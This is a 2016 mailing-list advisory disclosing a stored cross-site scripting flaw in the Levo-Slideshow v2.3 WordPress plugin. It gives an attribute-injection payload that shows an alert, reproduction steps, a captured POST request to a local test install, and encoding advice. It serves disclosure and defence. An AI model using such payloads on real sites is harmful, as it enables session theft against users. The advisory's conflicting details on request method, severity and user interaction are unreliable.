
Date: Tue, 7 Jun 2016 17:12:44 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: bugtraq@...urityfocus.com, bugs@...uritytracker.com
Subject: Wordpress Levo-Slideshow v2.3 - Persistent Vulnerability

Document Title:
===============
Wordpress Levo-Slideshow v2.3 - Persistent Vulnerability


References (Source):
====================
http://www.vulnerability-lab.com/get_content.php?id=1855


Release Date:
=============
2016-06-06


Vulnerability Laboratory ID (VL-ID):
====================================
1855


Common Vulnerability Scoring System:
====================================
2.5


Product & Service Introduction:
===============================
Make sure you have a Levo slideshow a very effective technique to display unlimited number of product images within a single 
box and just takes only few minutes to accomplish without getting too much into coding. No WP slider plugin has become as 
wide-spread and as popular recently as this particular free WP Levo slider, offering a marvelous method for displaying a lot 
of content in such a minimal space, and to mention also a great way to highlight your best and most popular product images 
or articles in an enhanced way. And on top off all that, this indispensable, yet smooth and free WP slider plugin is incorporated 
with amazing set of features including a colossal space set aside to main flash image, a miniature sized image, image reflection 
option, description box with title, navigation arrows, auto-play/pause button, auto play timer into your WP powered websites or blogs.

(Copy of the Homepage: http://wpslideshow.com/levo-slidehsow/ )


Abstract Advisory Information:
==============================
An independent Vulnerability Laboratory Researcher discovered a persistent cross site scripting vulnerability in the official Levo-Slideshow v2.3 wordpress plugin.


Vulnerability Disclosure Timeline:
==================================
2016-06-06:    Public Disclosure (Aaditya Purani)


Discovery Status:
=================
Published


Affected Product(s):
====================
Go Responsive (Themes)
Product: Levo-Slideshow - Wordpress Plugin (Web-Application) 2.3


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Low


Technical Details & Description:
================================
A persistent cross site scripting web vulnerabilities has been discovered  in the official Levo-Slideshow v2.3 wordpress plugin.
The client-side validation issue allows remote attacker to inject client-side script codes to compromise browser to application requests.

The vulnerability is located in the `image_description`parameter of the `Lenvo Image Upload` module. Remote attackers are able to inject 
client-side script code. The `image_description` value is wrong encoded and not filtered by the regular validation. The attack vector of 
the issue is client-side and the request method to execute is GET.

The security risk of the client-side vulnerabilities is estimated as medium with a cvss (common vulnerability scoring system) count of 2.5. 
Exploitation of the security vulnerability requires no a privileged web-application user account and low user interaction. 
Successful exploitation of the vulnerabilities results in session hijacking, non-persistent phishing, non-persistent external redirects, 
non-persistent load of malicious script codes or non-persistent web module context manipulation.

Request Method(s):
			[+] POST

Vulnerable Input(s):
			[+] Image Title
			[+] Image Description

Affected Module(s):
			[+] Edit Post


Proof of Concept (PoC):
=======================
The persistent cross site scripting vulnerability can be exploited by remote attackers without user interaction and with an uprivileged application user account.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.


PoC: Payload
t" onmouseover=alert(document.domain); a='


Manual steps to reproduce the vulnerability ...
1. Go to Levo Slideshow and click to Manage Images
2. Add an Image
Include to the Image Title input and script code payload enter the payload as follows
Note: t" onmouseover=alert(document.domain); a='
3. Save it and Reload the Page and Game over. :)


--- PoC Session Logs [POST] ---
$GET: http://localhost:8080/wordpress/wp-admin/
Host: localhost:8080
User-Agent: {Some User-Agent}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:8080/wordpress/wp-content/plugins/wp-levoslideshow/html/edit_image.php?album_id=1&lvo_image_id=2&KeepThis=true&
Cookie: {USERS COOKIE}
Connection: keep-alive
Content-Type: multipart/form-data; boundary=
---------------------------5673975277815470452141444322
Content-Length: 1370
If-Modified-Since: *
$POST :
-----------------------------5673975277815470452141444322rn
Content-Disposition: form-data; name="task"rn
rn
lvo_single_image_uploadrn
-----------------------------5673975277815470452141444322rn
Content-Disposition: form-data; name="TB_iframe"rn
rn
1rn
-----------------------------5673975277815470452141444322rn
Content-Disposition: form-data; name="album_id"rn
rn
1rn
-----------------------------5673975277815470452141444322rn
Content-Disposition: form-data; name="image_id"rn
rn
2rn
-----------------------------5673975277815470452141444322rn
Content-Disposition: form-data; name="image_thumb"rn
rn
generatern
-----------------------------5673975277815470452141444322rn
Content-Disposition: form-data; name="image_title"rn
rn
t" onmouseover=alert(document.domain); a='rn
-----------------------------5673975277815470452141444322rn
Content-Disposition: form-data; name="image_description"rn
rn
t" onmouseover=alert(document.domain); a='rn
-----------------------------5673975277815470452141444322rn
Content-Disposition: form-data; name="image_link"rn
rn
rn
-----------------------------5673975277815470452141444322rn
Content-Disposition: form-data; name="thumb_link"rn
rn
rn
-----------------------------5673975277815470452141444322rn
Content-Disposition: form-data; name="image_file"; filename=""rn
Content-Type: application/octet-streamrn
rn
rn
-----------------------------5673975277815470452141444322--rn


Note: After this gets saved, Go to http://localhost:8080/wordpress/wp-admin/admin.php?page=levoslideshow_manage&view=manage_album&album_id={Your Album where you saved}
And than Click on Edit, it will Trigger :) .Click the dit button to trigger the payload execution.


Solution - Fix & Patch:
=======================
The vulnerability can be patched by a secure parse and encode of the vulnerable marked input fields.
Encode all inputs and restrict the input by disallowing the usage of special chars to prevent application-side injection attacks.


Security Risk:
==============
The security risk of the persistent cross site scripting web vulnerability in the wordpress plugin is estimated as low. (CVSS 2.5)


Credits & Authors:
==================
Aaditya Purani - (https://aadityapurani.com) [http://www.vulnerability-lab.com/show.php?user=Aaditya%20Purani]


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or implied, 
including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any case of damage, 
including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability-Lab or its suppliers have been advised 
of the possibility of such damages. Some states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing 
limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface websites, hack into databases or trade with stolen data.

Domains:    www.vulnerability-lab.com 		- www.vuln-lab.com 						- www.evolution-sec.com
Contact:    admin@...nerability-lab.com 	- research@...nerability-lab.com 				- admin@...lution-sec.com
Section:    magazine.vulnerability-lab.com 	- vulnerability-lab.com/contact.php 				- evolution-sec.com/contact
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php

Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory. Permission to electronically 
redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by Vulnerability-Lab Research Team or 
its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark of vulnerability-lab team & the specific 
authors or managers. To record, list, modify, use or edit our material contact (admin@ or research@...nerability-lab.com) to get a ask permission.

				    Copyright © 2016 | Vulnerability Laboratory - [Evolution Security GmbH]™




-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com
CONTACT: research@...nerability-lab.com


